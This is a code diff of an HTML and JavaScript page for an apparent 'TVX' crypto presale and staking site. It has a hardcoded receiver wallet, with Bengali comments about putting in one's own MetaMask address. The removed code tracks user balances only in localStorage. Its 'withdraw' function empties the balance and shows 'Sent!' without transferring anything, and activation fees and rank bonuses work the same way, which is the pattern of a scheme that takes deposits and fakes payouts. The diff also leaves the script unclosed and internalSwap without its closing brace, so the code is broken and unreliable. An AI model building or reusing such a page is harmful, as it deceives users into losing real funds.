@@ -225,9 +225,11 @@
 
     </main>
 </div>
+
+<!-- JavaScript Logics Section -->
 <script>
 // --- CONFIGURATION ---
-const RECEIVER = "0x95222294dd7278aa3ddd389cc1e1d165cc4bafe5"; // ⚠️ অবশ্যই এখানে আপনার নিজের আসল ওয়ালেট অ্যাড্রেস বসাবেন
+const RECEIVER = "0x95222294dd7278aa3ddd389cc1e1d165cc4bafe5"; // ⚠️ এখানে আপনার আসল মেটামাস্ক অ্যাড্রেস বসান
 const RATE = 10000; 
 const TVX_USD = 0.01; 
 let BNB_USD = 600;
@@ -277,7 +279,7 @@ async function connect() {
     if (!window.ethereum) return Swal.fire("Error", "MetaMask Required", "error");
     try {
         const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
-        account = accs[0].toLowerCase(); // 🛠️ Fixed Array Pointer Error
+        account = accs[0].toLowerCase(); // Fixed Array pointer mapping
         provider = new ethers.providers.Web3Provider(window.ethereum);
         signer = provider.getSigner();
 
@@ -447,59 +449,5 @@ function stakeTokens() {
 
 function internalSwap() {
     if (!account) return;
-    const amt = parseFloat(document.getElementById("swapInput").value);
-    let d = db(); let u = d[account]; 
-    if (!amt || u.tvx < amt) return Swal.fire("Error", "Check Balance", "error");
-    u.tvx -= amt; u.bnb += (amt * TVX_USD) / BNB_USD;
-    u.txHistory.unshift({ type: 'SWAP', amt: amt+' TVX to BNB' });
-    save(d); update(); Swal.fire("Success", "TVX converted to Income!", "success");
-}
-
-function activate() {
-    if (!account) return;
-    let d = db(); if (d[account].tvx < 10000) return Swal.fire("Error", "Need 10,000 TVX", "error");
-    d[account].active = true; d[account].tvx -= 10000; d[account].stakeStart = Date.now();
-    d[account].txHistory.unshift({ type: 'ACTIVATE', amt: '10,000 TVX' });
-    save(d); update(); Swal.fire("Success", "Staking & Withdrawals Active!", "success");
-}
-
-function withdraw() {
-    if (!account) return;
-    let d = db(); let u = d[account];
-    if (!u.active) return Swal.fire("Activation Required", "Activate card to withdraw.", "warning");
-    if (u.bnb <= 0) return Swal.fire("Empty Balance", "Nothing available to withdraw.", "info");
     
-    d[account].txHistory.unshift({ type: 'WITHDRAW', amt: '$'+((u.bnb*BNB_USD)).toFixed(2) });
-    u.bnb = 0; save(d); update(); Swal.fire("Sent!", "Withdrawal processing...", "success");
-}
 
-function claimReward(rank, bonus) {
-    if (!account) return;
-    let d = db(); d[account].claimed.push(rank); d[account].bnb += (bonus / BNB_USD);
-    d[account].txHistory.unshift({ type: 'BONUS', amt: rank + ' Reward' });
-    save(d); update(); Swal.fire("Congratulations!", `Achieving ${rank} earned you $${bonus}!`, "success");
-}
-
-function logout() { 
-    localStorage.removeItem("connected"); 
-    window.location.reload(); 
-}
-
-function updatePreview() { 
-    if(document.getElementById("bnbInput") && document.getElementById("previewTVX")) {
-        document.getElementById("previewTVX").innerText = (document.getElementById("bnbInput").value * RATE).toLocaleString() + " TVX"; 
-    }
-}
-function updateSwapPreview() {
-    const tvx = document.getElementById("swapInput").value;
-    if(document.getElementById("swapPreviewBNB")) {
-        document.getElementById("swapPreviewBNB").innerText = tvx ? ((tvx * TVX_USD) / BNB_USD).toFixed(6) + " BNB" : "0.0000 BNB";
-    }
-}
-
-window.addEventListener('load', () => { 
-    if (localStorage.getItem("connected") === "true") connect(); 
-});
-</script>
-</body>
-</html>
